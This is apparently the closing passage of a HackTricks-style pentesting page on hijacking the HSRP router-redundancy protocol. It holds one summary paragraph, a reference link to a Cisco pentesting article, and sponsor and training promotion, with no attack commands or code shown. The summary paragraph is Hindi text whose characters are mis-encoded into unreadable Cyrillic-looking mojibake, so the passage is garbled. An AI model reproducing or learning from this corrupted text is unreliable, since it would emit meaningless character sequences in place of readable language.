рдЗрди рдЪрд░рдгреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдФрд░ рд╣реЗрд░рдлреЗрд░ рдХрд░рдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ GLBP рд╣рд╛рдИрдЬреИрдХрд┐рдВрдЧ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рдорд╛рди рд╣реИред рдпрд╣ HSRP рдЬреИрд╕реЗ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдордЬрдмреВрдд рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

## References
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
